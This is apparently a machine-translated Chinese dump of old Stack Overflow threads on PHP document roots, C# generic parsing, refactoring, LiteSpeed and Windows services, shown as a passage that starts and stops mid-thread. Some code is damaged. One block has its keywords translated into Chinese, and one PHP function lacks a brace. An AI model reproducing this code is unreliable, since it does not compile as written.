> 赞同：0
> 
> 时间：2008-12-24T03:26:16.720

如果使用 .NET 2.0 或更高版本，请使用以下内容：

```
String.IsNullOrEmpty(thestringobject) 
```

将评估为 True 或 False 取决于。我通常在实用程序类中创建另一个函数来执行此检查并检查修剪/长度，以便我知道字符串对象是 null、空还是一堆空白。

# apache - LiteSpeed 与 Apache httpd

> ID：390266
> 
> 赞同：16
> 
> 时间：2008-12-23T22:38:48.657
> 
> 标签：apache, webserver, litespeed

我最近听说[LiteSpeed](http://litespeedtech.com/)网络服务器可以替代 Apache 网络服务器。甚至我的虚拟主机也将用 LiteSpeed 替换他们共享的虚拟主机环境（我目前不确定我是否必须对此感到高兴）。

是否有人对 LiteSpeed 网络服务器有任何经验（包括开发和生产）？如果您能在这里分享您的经验，我们将不胜感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-28T15:40:28.123

您应该查看这些链接；

*   [LiteSpeed 与 Apache（来自 Litespeed Tech）](https://web-beta.archive.org/web/20130307215125/http://www.litespeedtech.com/litespeed-vs-apache.html)
*   [基准测试：LiteSpeed 与 Apache（PHP 和纯 HTML）](http://www.beyondcoding.com/2008/02/25/benchmark-litespeed-vs-apache-php-and-plain-html/)
*   [LiteSpeed 与 Apache](http://forums.digitalpoint.com/showthread.php?t=438134)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2010-10-30T09:56:02.723

Apache 可以配置为与 Litespeed 一样运行。你的主人可能正在采取懒惰的方式。在这个基准测试中，Apache 击败了 Litespeed（在一些帮助下）。看看：[Apache vs Litespeed](http://www.unixy.net/apache-vs-litespeed/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-03-15T18:36:42.510

[您还可以在http://vbtechsupport.com/26/](http://vbtechsupport.com/26/)上查看 litespeed 缓存与 apache + varnish 的基准测试，也可以在[http://www.vbulletin.com/forum/entry](http://www.vbulletin.com/forum/entry.php/2452-Boosting-vBulletin-performance-via-caching-Apache-Varnish-versus-Litespeed-Cache)上查看litespeed 与 apache 与 nginx 之间的静态文件比较。 [php/2452-Boosting-vBulletin-performance-via-caching-Apache-Varnish-与-Litespeed-Cache](http://www.vbulletin.com/forum/entry.php/2452-Boosting-vBulletin-performance-via-caching-Apache-Varnish-versus-Litespeed-Cache)

# php - 如何以编程方式确定 PHP 中的文档根目录？

> ID：390276
> 
> 赞同：6
> 
> 时间：2008-12-23T22:43:19.723
> 
> 标签：php, apache, configuration

这是我最近遇到的一个问题 - 网络主机上的 apache 配置错误。这意味着所有依赖于`$_SERVER['DOCUMENT_ROOT']`break的脚本。我发现的最简单的解决方法是在一些共享的全局包含文件中设置变量，但不要忘记它会很痛苦。我的问题是，如何以编程方式确定正确的文档根目录？

例如，在一台主机上，设置如下：

```
$_SERVER['DOCUMENT_ROOT'] == '/htdocs' 
```

真正的文档根是：

```
test.example.com -> /data/htdocs/example.com/test
www.example.com -> /data/htdocs/example.com/www 
```

而且我想要一个从`www.example.com/blog/`（在路径上`/data/htdocs/example.com/www/blog`）运行的脚本以获得正确的值`/data/htdocs/example.com/www`。

在另一台主机上，设置有点不同：

```
$_SERVER['DOCUMENT_ROOT'] == '/srv'
test.example.com -> /home/virtual_web/example.com/public_html/test
www.example.com -> /home/virtual_web/example.com/public_html/www 
```

有什么解决办法吗？还是根本不依赖`$_SERVER['DOCUMENT_ROOT']`和修复我在我的站点上运行的所有软件的唯一方法？在主机方面解决这个问题似乎不是一个选择，我还没有遇到一个配置正确的主机。我得到的最好的结果是一个指向 www.example.com 的文档根，它至少在 open_basedir 内部——他们使用了另一种命名方案，www.example.com 将指向`/u2/www/example_com/data/www/`.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-23T23:21:32.173

在 PHP5 中有一个神奇的常量`__FILE__`，它包含它所在文件的绝对路径。您可以将它与 dirname 结合使用来计算文档根目录。

您可以在配置文件中添加如下语句

```
define ('DOCUMENT_ROOT', dirname(__FILE__)); 
```

这应该可以解决问题

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-23T23:50:22.053

无需修改所有脚本。

您可以在运行任何脚本之前运行 PHP 文件，使用[`auto_prepend_file`](http://uk.php.net/manual/en/ini.core.php).

`$_SERVER`只是一个数组，你*可以*修改它并设置正确`$_SERVER['DOCUMENT_ROOT']`的 .

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-24T12:58:00.483

这就是为什么人们使用 htaccess 和/或查询字符串通过引导程序 /index.php 虹吸一切的原因之一。您可以使用`dirname( __FILE__ )`上面提到的技巧并以这种方式获得应用程序的公共基础。

如果您过于深入而无法切换到单个入口点，我见过人们做的一件事是在他们的脚本中有一个公共头文件，该头文件会沿着目录树向上查找一个对基本目录唯一的文件：

```
function findAppBase( $dir ) {
    if( file_exists( "$dir/unique_file.txt" ) ) {
        return $dir;

    return findAppBase( dirname( $dir ) );
}

$base = findAppBase( dirname( __FILE__ ) ); 
```

该代码尚未经过测试，并且可能有一种更巧妙的方式使用 vars in`$_ENV`或者`$_SERVER`可以执行您想要的操作...

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-24T10:43:33.813

基于[http://www.helicron.net/php/](http://www.helicron.net/php/)：

```
$localpath=getenv("SCRIPT_NAME");
$absolutepath=getenv("SCRIPT_FILENAME");
$_SERVER['DOCUMENT_ROOT']=substr($absolutepath,0,strpos($absolutepath,$localpath)); 
```

我不得不更改 basename/realpath 技巧，因为它在我的主机上返回了一个空字符串。相反，我使用`SCRIPT_FILENAME`. 这可能不再适用于 IIS（但使用 $_SERVER 变量的原始脚本可能也不会）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T22:50:07.497

PHP*应该*将当前目录设置为脚本所在的目录，因此只要没有损坏，您应该能够使用`$_SERVER['SCRIPT_FILENAME']`and找出文档根目录`getcwd()`。（我不记得我脑海中所有的 $_SERVER 变量，phpinfo() 中可能有一些更有用的东西。）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-24T12:33:54.570

为什么不要求您的虚拟主机正确配置他的服务器？

这些事情往往会在您的代码中默默地徘徊，并且在有人最终修复服务器之前永远不会被删除（但仍然处于活动状态）。然后一切都会再次破裂。

或者，将您的东西移到可以工作的主机上。如果这被打破了，谁知道你接下来会发现什么。

# asp.net - ASP.NET 开发服务器 - 403 禁止

> ID：390278
> 
> 赞同：1
> 
> 时间：2008-12-23T22:43:51.487
> 
> 标签：asp.net, remoting

我正在设置一台新 PC，并安装了我的项目以供使用。它是一个 .NET Remoting 2.0 应用程序，在开发时使用 ASP.NET 开发服务器托管服务器端。当我向服务器发出请求时，我收到以下错误：

“远程服务器返回错误：(403) Forbidden。”

我检查了传入的凭据，一切似乎都是正确的。该调用对我的开发框来说都是本地的，并且最重要的是。代码没有改变，我所有的同事都工作正常。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T20:07:34.313

好的。我找到了答案……不过一天中更好的部分。原来 403 错误是由我们过滤 IP 值的通道接收器提供商之一引发的。通道接收器提供程序是在一些大的假设下编写的。

首先，它正在寻找调用机器的地址并将其与 ip 白名单进行比较。作者盲目地收集了列表中的第一个条目：

```
Dns.GetHostEntry(machineName).AddressList[0].Address 
```

结果在我的新机器上，我启用了 IPv6，所以第一个条目实际上是 IPv6 条目。参考 MSDN 后，我发现 Address 属性现在“已过时”，原因很明显。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T23:01:08.643

错误子代码是什么？

```
403 - Forbidden. IIS defines several different 403 errors that indicate a more specific cause of the error:
•   403.1 - Execute access forbidden.
•   403.2 - Read access forbidden.
•   403.3 - Write access forbidden.
•   403.4 - SSL required.
•   403.5 - SSL 128 required.
•   403.6 - IP address rejected.
•   403.7 - Client certificate required.
•   403.8 - Site access denied.
•   403.9 - Too many users.
•   403.10 - Invalid configuration.
•   403.11 - Password change.
•   403.12 - Mapper denied access.
•   403.13 - Client certificate revoked.
•   403.14 - Directory listing denied.
•   403.15 - Client Access Licenses exceeded.
•   403.16 - Client certificate is untrusted or invalid.
•   403.17 - Client certificate has expired or is not yet valid.
•   403.18 - Cannot execute requested URL in the current application pool. This error code is specific to IIS 6.0.
•   403.19 - Cannot execute CGIs for the client in this application pool. This error code is specific to IIS 6.0.
•   403.20 - Passport logon failed. This error code is specific to IIS 6.0. 
```

# apache-flex - 如何在 Flex 3 中编写独立的 ColdFusion 类？

> ID：390284
> 
> 赞同：0
> 
> 时间：2008-12-23T22:46:18.143
> 
> 标签：apache-flex, coldfusion

使用带有 ColdFusion 插件的 Flex 3，我不能编写一个可以从我的 flex 网站 (mxml) 调用的独立 ColdFusion 类吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-30T15:25:43.957

You can invoke methods in a standalone ColdFusion CFC using RemoteObject. Note these methods should be marked with access="remote" in ColdFusion.

```
<mx:Script>
    <![CDATA[
    private function callMethod():void
    {
      ro.MethodName;
    } 

    private function resultHandler(evt:ResultEvent):void
    {
      //Handle result
    }

    private function faultHandler(evt:FaultEvent):void
    {
     // Handle fault

    }
    ]]>
</mx:Script>
<mx:RemoteObject id="ro" destination="ColdFusion" source="ColdFusionCFC">
    <mx:method name="MethodName" result="resultHandler" fault="faultHandler"/>
</mx:RemoteObject> 
```

You can also link Flex Classes to ColdFusion CFC using [RemoteClass(alias="ColdFusionCFC")]. This allows you to pass objects between ColFusion and Flex.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-30T16:44:51.173

您需要运行 ColdFusion 服务器才能实际使用 CF 类 - 抱歉，如果这看起来过于明显，但您没有提到您正在运行 CF，所以我想确保已涵盖 :)

除此之外，您当然可以使用任何工具编写 CF 类/组件 (CFC)，尽管有些工具比其他工具更有帮助。查看 CFEclipse.org 以获取免费的 Eclipse 插件编辑器。Adobe 还发布了用于 Eclipse 的 ColdFusion Extensions，它将基于 ActionScript 类以及数据库模型 ( [http://www.adobe.com/support/coldfusion/downloads.html](http://www.adobe.com/support/coldfusion/downloads.html) ) 生成 CFC。这些工具可以帮助您节省一些打字时间。

# c# - 没有装箱的通用解析方法

> ID：390286
> 
> 赞同：14
> 
> 时间：2008-12-23T22:47:03.507
> 
> 标签：c#, generics, reflection

我正在尝试编写一个通用 Parse 方法，该方法从 NamedValueCollection 转换并返回强类型值。我尝试了两种方法，但这两种方法都通过装箱和拆箱来获得价值。有谁知道避免拳击的方法？如果您在生产中看到它，您会不喜欢它，它对性能有多糟糕？

用法：

```
var id = Request.QueryString.Parse<int>("id"); 
```

尝试#1：

```
public static T Parse<T>(this NameValueCollection col, string key)
{
    string value = col[key];

    if (string.IsNullOrEmpty(value))
        return default(T);

    if (typeof(T) == typeof(int))
    {
        //return int.Parse(value); // cannot convert int to T
        //return (T)int.Parse(value); // cannot convert int to T
        return (T)(object)int.Parse(value); // works but boxes
    }
    if (typeof(T) == typeof(long))
    {
        return (T)(object)long.Parse(value); // works but boxes
    }
    ...

    return default(T);
} 
```

尝试#2（使用反射）：

```
public static T Parse<T>(this NameValueCollection col, string key)
{
    string value = col[key];

    if (string.IsNullOrEmpty(value))
        return default(T);

    try
    {
        var parseMethod = typeof(T).GetMethod("Parse", new Type[] { typeof(string) });

        if (parseMethod == null)
            return default(T);

        // still boxing because invoke returns an object
        var parsedVal = parseMethod.Invoke(null, new object[] { value });
        return (T)parsedVal;
    }
    // No Proper Parse Method found
    catch(AmbiguousMatchException) 
    {
    }

    return default(T);
} 
```

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2008-12-23T22:57:33.610

```
public static T Parse<T>(this NameValueCollection col, string key)
{
  return (T)Convert.ChangeType(col[key], typeof(T));
} 
```

我不完全确定 ChangeType 框与否（我想阅读文档会告诉我，但我现在时间紧迫），但至少它摆脱了所有类型检查。不过，拳击开销不是很高，所以我不会太担心。如果您担心运行时类型的一致性，我会将函数编写为：

```
public static T Parse<T>(this NameValueCollection col, string key)
{
  T value;

  try
  {
    value = (T)Convert.ChangeType(col[key], typeof(T));
  }
  catch
  {
    value = default(T);
  }

  return value;
} 
```

这样，如果由于某种原因无法转换值，该函数就不会爆炸。当然，这意味着您必须检查返回的值（因为用户可以编辑查询字符串，所以无论如何您都必须这样做）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-12-23T23:43:03.160

我认为您高估了装箱/拆箱的影响。parse 方法将有更大的开销（字符串解析），使装箱开销相形见绌。此外，所有 if 语句都会产生更大的影响。反射具有最大的影响。

我不希望在生产中看到这种代码，因为有一种更清洁的方法。我遇到的主要问题是您需要涵盖所有情况的大量 if 语句以及有人可以将任何旧类型传递给它的事实。

我要做的是为我想要解析的每种类型编写一个解析函数（即 ParseInt()）。它更清晰，并且很好地定义了该函数将尝试做什么。同样对于短静态方法，编译器更有可能内联它们，从而节省函数调用。

我认为这是泛型的糟糕应用，这样做有什么特别的原因吗？

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2011-10-07T11:51:51.173

我将添加一些未记录的方式：

```
public static T Convert<T>()
{
    if (typeof(T) == typeof(int))
    {
        int a = 5;
        T value = __refvalue(__makeref(a), T);
        return value;
    }
    else if (typeof(T) == typeof(long))
    {
        long a = 6;
        T value = __refvalue(__makeref(a), T);
        return value;
    }

    throw new NotImplementedException();
} 
```

关于它们的文档很少，但它们从 C# 4.0 开始工作。例如在这里阅读[C# 的隐藏功能？](https://stackoverflow.com/questions/9033/hidden-features-of-c/9125#9125)请记住，无证意味着不受支持，等等等等，如果你使用它们，未来就无法工作等等等等，魔鬼会来找你等等等等 :-)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-09-12T10:26:29.720

为了更好的可读性，您可以使用带有匿名函数的通用字典，如下所示：

```
var parserFuncs = new Dictionary<Type, Func<string, object>>() {
    { typeof(int), p => (int) int.Parse(p) },
    { typeof(bool), p => (bool) bool.Parse(p) },
    { typeof(long), p => (long) long.Parse(p) },
    { typeof(short), p => (short) short.Parse(p) },
    { typeof(DateTime), p => (DateTime) DateTime.Parse(p) }
    /* ...same for all the other primitive types */
};

return (T) parserFuncs[typeof(T)](value); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-17T19:44:54.787

另一个实现建议，使用带有通用方法的 TryParse 或 Parse 方法。我写这个最初是为了将从 csv 文件解析的字符串转换为不同的类型，int、decimal、list 等。

```
 public static bool TryParse<T>(this string value, out T newValue, T defaultValue = default(T))
        where T : struct, IConvertible
    {
        newValue = defaultValue;
        try
        {
            newValue = (T)Convert.ChangeType(value, typeof(T));
        }
        catch
        {
            return false;
        }
        return true;
    }

    public static T Parse<T>(this string value)
        where T : struct, IConvertible
    {
        return (T) Convert.ChangeType(value, typeof (T));
    } 
```

这里 try parse 方法首先将 newValue 设置为默认值，然后尝试将 value 转换为 T 类型，并将 newValue 作为 T 类型返回。如果转换失败，则返回 T 的默认值。

Parse 方法只是尝试进行转换，但是如果它不是失败安全的，并且如果转换失败将抛出异常。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-11-16T17:27:17.067

```
int value = int.Parse(Request.QueryString["RecordID"]); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-03T09:02:28.690

这是一个实施建议，遵循罗伯特瓦格纳的逻辑，但使用通用方法来减少重复：

```
public static int ParseInt32(this NameValueCollection col, string key)
{
    return Parse(col, key, int.Parse);
}
public static double ParseDouble(this NameValueCollection col, string key)
{
    return Parse(col, key, double.Parse);
}
private static T Parse<T>(NameValueCollection col, string key, Func<string, T> parse)
{
    string value = col[key];

    if (string.IsNullOrEmpty(value))
        return default(T);

    return parse(value);
} 
```

说实话，为 null 或空字符串返回零让我害怕。如果某些值合法地为零，这可能会导致问题。相反，我会让方法返回可空值（`int?`、`double?`等），这是一种比用于框架方法的外参数模式更紧凑的`TryParse`方法。你可以这样做：

```
public static int? ParseInt32(this NameValueCollection col, string key)
{
    return Parse(col, key, int.Parse);
}
public static double? ParseDouble(this NameValueCollection col, string key)
{
    return Parse(col, key, double.Parse);
}
private static T? Parse<T>(NameValueCollection col, string key, Func<string, T> parse)
    where T : struct    
{
    string value = col[key];

    if (string.IsNullOrEmpty(value))
        return default(T?);

    return parse(value);
} 
```

但这仍然会为非数字的非空或空字符串引发异常。最好使用 TryParse。内置的 Func 委托不支持 ref 或 out 参数，因此您必须声明自己的委托类型，但这很简单。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-02-25T12:54:24.063

我是不是太晚了？

```
static Dictionary<Type, Delegate> table = 
    new Dictionary<Type, Delegate>{
        { typeof(int), (Func<string,int>)Int32.Parse },
        { typeof(double), (Func<string,double>)Double.Parse },
        // ... as many as you want
    };

static T Parse<T>(string str)
{
    if (!table.TryGet(typeof(T), out Delegate func))
        throw new ArgumentException();
    var typedFunc = (Func<string, T>)func;
    return typedFunc(str);
} 
```

当遇到类型问题时，请尝试委托和字典！

# refactoring - 当你跨越它们时，你总是重构哪些类型的编码反模式？

> ID：390289
> 
> 赞同：7
> 
> 时间：2008-12-23T22:48:02.210
> 
> 标签：refactoring, anti-patterns

我刚刚重构了一些位于我正在处理的类的不同部分的代码，因为它是一系列嵌套的条件运算符 (?:)，通过一个相当简单的 switch 语句 (C#) 变得更加清晰。

您什么时候会触摸与您正在处理的代码不直接相关的代码以使其更清晰？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-12-24T00:34:57.487

我曾经在重构并遇到过类似这样的代码：

```
string strMyString;
try
{
  strMyString = Session["MySessionVar"].ToString();
}
catch
{
  strMyString = "";
} 
```

Resharper 指出 .ToString() 是多余的，所以我把它拿出来了。不幸的是，这最终破坏了代码。每当 MySessionVar 为空时，它都不会导致代码依赖的 NullReferenceException 将其撞到 catch 块。我知道，这是一些可悲的代码。但我确实从中吸取了很好的教训。不要依靠工具来快速浏览旧代码来帮助您进行重构——请自己思考。

我最终将其重构如下：

```
string strMyString = Session["MySessionVar"] ?? ""; 
```

**更新：** 由于这篇文章正在被投票并且在技术上不包含问题的答案，我认为我应该真正回答这个问题。（好吧，这让我很困扰，以至于我实际上是在做梦。）

就我个人而言，在重构之前我会问自己几个问题。

1) 系统是否处于源代码控制之下？如果是这样，请继续重构，因为如果出现问题，您总是可以回滚。

2) 我正在更改的功能是否存在单元测试？如果是这样，太好了！重构。这里的危险是单元测试的存在并不能表明所述单元测试的准确性和范围。好的单元测试应该能够发现任何重大变化。

3) 我是否完全理解我正在重构的代码？如果没有源代码控制和测试，而且我并不真正理解我正在更改的代码，那就是一个危险信号。在重构之前，我需要对代码更加熟悉。

在 #3 的情况下，我可能会花时间实际跟踪当前正在使用我正在重构的方法的所有代码。根据代码的范围，这可能很容易或不可能（即，如果它是公共 API）。如果归结为公共 API，那么您确实需要从业务角度了解代码的初衷。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-23T23:18:19.967

如果测试已经到位，我只重构它。如果没有，通常不值得我花时间为可能工作的代码编写测试*和*重构。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-24T01:30:50.917

这是一个很小的、次要的反模式，但它让我很恼火，以至于**每当我发现它时，我都会立即删除它**。在 C（或 C++ 或 Java）中

```
if (p)
    return true;
else
    return false; 
```

变成

```
return p; 
```

在方案中，

```
(if p #t #f) 
```

变成

```
p 
```

在机器学习中

```
if p then true else false 
```

变成

```
p 
```

我几乎只在**本科生编写的代码**中看到这种反模式。我绝对**不是在编造这个**！！

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-12-23T22:49:23.940

每当我遇到它并且我认为更改它不会导致问题时（例如，我可以充分理解它，以至于我知道它的作用。例如，巫毒教的水平很低）。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-23T23:09:32.543

如果有其他原因我正在修改代码，我只会费心去改变它。

我愿意走多远取决于我对不会破坏任何东西的信心以及我自己对代码的更改将有多广泛。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-12-23T23:32:39.767

这是展示单元测试好处的好时机。

如果单元测试到位，开发人员可以勇敢而积极地重构他们可能遇到的奇怪编写的代码。如果它通过了单元测试并且你增加了可读性，那么你已经做了一天的好事，可以继续前进。

如果没有单元测试，简化充满巫术的复杂代码会带来破坏代码的巨大风险，甚至不知道您引入了一个新错误！因此，大多数开发人员会采取谨慎的路线并继续前进。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-12-24T04:43:46.360

对于简单的重构，我尝试清理深度嵌套的控制结构和非常长的函数（超过一屏的文本）。然而，在没有充分理由的情况下重构代码并不是一个好主意（尤其是在一大群开发人员中）。一般来说，除非重构会对代码有很大的改进或修复一个严重的罪过，否则我会尽量不去管它。

不是按说重构，而是作为一般的内务处理问题，当我开始处理模块时，我通常会做这些事情：

*   删除愚蠢的评论
    *   仅说明函数签名已经说明的注释
    *   纯粹白痴的评论，例如“看起来就是这样”
    *   文件顶部的变更日志（我们有版本控制是有原因的）
    *   任何与代码明显不同步的 API 文档
*   删除注释掉的代码块
*   如果缺少版本控制标签，请添加 $Id$
*   修复空格问题（这可能会令其他人烦恼，因为即使您所做的只是更改空格，您的名字也会出现在 diff 中的很多行中）
    *   删除行尾的空格
    *   更改制表符-> 空格（因为这是我工作的约定）

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-23T22:50:43.733

通常我不会重构代码，如果我只是浏览它，而不是积极地处理它。

但有时 ReSharper 会指出一些我无法抗拒 Alt+Enter 的东西。:)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-12-23T22:52:51.530

如果重构使代码*更*易于阅读，对我来说最常见的是重复代码，例如 if/else 仅与第一个/最后一个命令不同。

```
if($something) {
  load_data($something);
} else {
  load_data($something);
  echo "Loaded";
  do_something_else();
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-12-24T00:48:32.843

超过（可以说）三四行重复代码**总是**让我想到重构。此外，我倾向于大量移动代码，将我预测会更频繁使用的代码提取到一个单独的地方——一个具有自己明确定义的目的和职责的类，或者一个静态类的静态方法（通常放在我的 Utils.* 命名空间）。

但是，要回答您的问题，是的，在很多情况下，缩短代码并不一定意味着使其结构良好且可读性好。使用**??** C# 中的运算符是另一个示例。您还必须考虑您选择的语言中的新功能 - 例如，LINQ 可用于以**非常优雅的方式完成一些事情，但也可以使非常简单的事情变得非常难以阅读**和过于复杂。您需要非常仔细地权衡这两件事，最终这一切都归结为您的个人品味，主要是经验。

好吧，这是另一个“取决于”的答案，但恐怕必须如此。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-12-24T03:12:00.417

我几乎总是将> 2个类似的条件分解成一个开关......最常见的是关于枚举。我会做一个简短的回报而不是一个长的声明。

前任：

```
如果（条件）{
  //很多代码
  //返回值
} 别的 {
  返回空值；
}
```

变成：

```
如果（！条件）
  返回空值；

//很多代码..
//返回值
```

提前突破可以减少额外的缩进，并减少长代码......通常我不喜欢超过 10-15 行代码的方法。我喜欢方法有一个单一的目的，即使在内部创建更多的私有方法。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-12-23T23:11:44.970

如果我了解块的输入和输出集，我倾向于重构非常长的函数和方法。

这有助于无止境的可读性。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-12-23T23:32:23.917

在完成以下步骤后，我只会重构我遇到并且没有积极工作的代码：

*   与代码的作者交谈（并非总是可能）以弄清楚那段代码的作用。即使我很清楚这段代码在做什么，它总是有助于理解为什么作者可能决定以某种方式做某事的理由。花几分钟谈论它不仅可以帮助原作者理解您的观点，还可以在团队内部建立信任。
*   了解或找出那段代码在做什么，以便在重构后对其进行测试（带有单元测试的构建过程在这里非常有用。它使整个事情变得快速而简单）。在更改之前和之后运行单元测试，并确保没有任何内容因您的更改而中断。
*   向团队发出提示（如果与其他人一起工作）并让他们知道即将发生的变化，这样当变化实际发生时没有人会感到惊讶

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-12-24T01:23:12.320

为之而重构是万恶之源之一。请永远不要这样做。（单元测试确实在一定程度上缓解了这一点）。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2008-12-24T03:19:05.753

大量注释掉的代码是反模式吗？虽然没有具体编码，（它的评论）我看到很多这种行为与不了解如何使用源代码控制的人，以及想要保留旧代码以供以后使用，以便他们可以更轻松地返回引入了一个错误。每当我看到大量被注释掉的代码时，我几乎总是将它们全部删除。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-12-24T03:26:11.853

我尝试根据以下因素进行重构：

1.  我是否足够了解以了解发生了什么？
2.  如果此更改破坏了代码，我可以轻松恢复吗？
3.  如果它破坏了构建，我是否有足够的时间来恢复更改。

有时，如果我有足够的时间，我会重构来学习。如，我知道我的更改可能会破坏代码，但我不知道在哪里以及如何。所以我无论如何都会改变它以找出它在哪里破坏以及为什么。这样我就可以更多地了解代码。

我的领域是移动软件（手机），其中大部分代码都驻留在我的 PC 上，不会影响其他人。由于我还为我的公司维护 CI 构建系统，我可以在重构代码上运行完整的产品构建（适用于所有手机），以确保它不会破坏其他任何东西。但那是我个人的奢侈品，你可能没有。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2008-12-24T05:46:06.687

如果可以将全局常量和枚举视为低重构风险，我倾向于对其进行相当多的重构。也许只是这样，但是像 ClientAccountStatus 枚举之类的东西应该在 ClientAccount 类中或附近，而不是在 GlobalConstAndEnum 类中。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2009-05-21T17:07:00.833

删除/更新明显错误或明显无意义的评论。
删除它们是：

1.  安全的
2.  版本控制意味着您可以再次找到它们
3.  提高对他人和您自己的代码质量

这是我所知道的唯一 100% 无风险的重构。

请注意，在javadoc 注释等*结构化*注释中执行此操作是另一回事。更改这些并非没有风险，因此它们很*可能*会被修复/删除，但不会像标准的错误代码注释那样死掉某些有保证的修复。

# windows-services - Windows 服务与计划任务

> ID：390307
> 
> 赞同：121
> 
> 时间：2008-12-23T22:55:13.350
> 
> 标签：windows-services, scheduled-tasks

Windows 服务与重复运行程序（例如每两分钟）的计划任务的优缺点是什么？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2009-11-16T20:39:17.507

**更新：**

**在我最初的答案之后将近四年，这个答案已经过时了。自从[TopShelf](http://docs.topshelf-project.com/en/latest/overview/faq.html)出现以来，Windows 服务的开发变得很容易。现在你只需要弄清楚如何支持故障转移......**

原答案：

我真的不是 Windows Scheduler 的粉丝。[正如上面@moodforall](https://stackoverflow.com/a/390321/179669)指出的那样，必须提供用户的密码，当有人更改该用户的密码时，这很有趣。

Windows 调度程序的另一个主要烦恼是它以交互方式运行，而不是作为后台进程。当在 RDP 会话期间每 20 分钟弹出 15 个 MS-DOS 窗口时，您会因为没有将它们安装为 Windows 服务而自责。

无论您选择什么，我当然建议您将处理代码与控制台应用程序或 Windows 服务分开到不同的组件中。然后，您可以选择从控制台应用程序调用工作进程并将其挂接到 Windows 调度程序，或者使用 Windows 服务。

您会发现调度 Windows 服务并不有趣。一个相当常见的情况是您有一个长时间运行的进程，您希望定期运行该进程。但是，如果您正在处理一个队列，那么您真的不希望同一个工作人员的两个实例处理同一个队列。因此，您需要管理计时器，以确保您的长时间运行的进程运行时间超过指定的计时器间隔，直到现有进程完成后它才会再次启动。

在你写完所有这些之后，你会想，为什么我不直接使用 Thread.Sleep？这允许我让当前线程继续运行直到它完成，然后暂停间隔开始，线程进入睡眠状态并在所需时间后再次启动。整洁的！

然后，您阅读了互联网上的所有建议，许多专家告诉您这是多么糟糕的编程实践：

[http://msmvps.com/blogs/peterritchie/archive/2007/04/26/thread-sleep-is-a-sign-of-a-poorly-design-program.aspx](http://msmvps.com/blogs/peterritchie/archive/2007/04/26/thread-sleep-is-a-sign-of-a-poorly-designed-program.aspx)

所以你会摸不着头脑，心里想，WTF，撤消待处理的结帐 -> 是的，我确定 -> 撤消今天的所有工作......该死，该死，该死......

但是，我确实喜欢这种模式，即使每个人都认为这是垃圾：

> **OnStart 方法为单线程方法。**
> 
> ```
> protected override void OnStart (string args) {
> 
>    // Create worker thread; this will invoke the WorkerFunction
>    // when we start it.
>    // Since we use a separate worker thread, the main service
>    // thread will return quickly, telling Windows that service has started
>    ThreadStart st = new ThreadStart(WorkerFunction);
>    workerThread = new Thread(st);
> 
>    // set flag to indicate worker thread is active
>    serviceStarted = true;
> 
>    // start the thread
>    workerThread.Start();
> } 
> ```
> 
> 该代码实例化了一个单独的线程并将我们的工作函数附加到它。然后它启动线程并让 OnStart 事件完成，这样 Windows 就不会认为该服务已挂起。
> 
> **单线程方法的 Worker 方法。**
> 
> ```
> /// <summary>
> /// This function will do all the work
> /// Once it is done with its tasks, it will be suspended for some time;
> /// it will continue to repeat this until the service is stopped
> /// </summary>
> private void WorkerFunction() {
> 
>    // start an endless loop; loop will abort only when "serviceStarted"
>    // flag = false
>    while (serviceStarted) {
> 
>       // do something
>       // exception handling omitted here for simplicity
>       EventLog.WriteEntry("Service working",
>          System.Diagnostics.EventLogEntryType.Information);
> 
>       // yield
>       if (serviceStarted) {
>          Thread.Sleep(new TimeSpan(0, interval, 0));
>       }
>    }
> 
>    // time to end the thread
>    Thread.CurrentThread.Abort();
> } 
> ```
> 
> **OnStop 方法用于单线程方法。**
> 
> ```
> protected override void OnStop() {
> 
>    // flag to tell the worker process to stop
>    serviceStarted = false;
> 
>    // give it a little time to finish any pending work
>    workerThread.Join(new TimeSpan(0,2,0));
> } 
> ```

来源：[http ://tutorials.csharp-online.net/Creating_a_.NET_Windows_Service%E2%80%94Alternative_1%3a_Use_a_Separate_Thread](http://en.csharp-online.net/Creating_a_.NET_Windows_Service%E2%80%94Alternative_1:_Use_a_Separate_Thread) *（死链接）*

多年来，我一直在运行许多这样的 Windows 服务，它对我有用。我还没有看到人们同意的推荐模式。只做对你有用的事。

* * *

## 回答 #2

> 赞同：17
> 
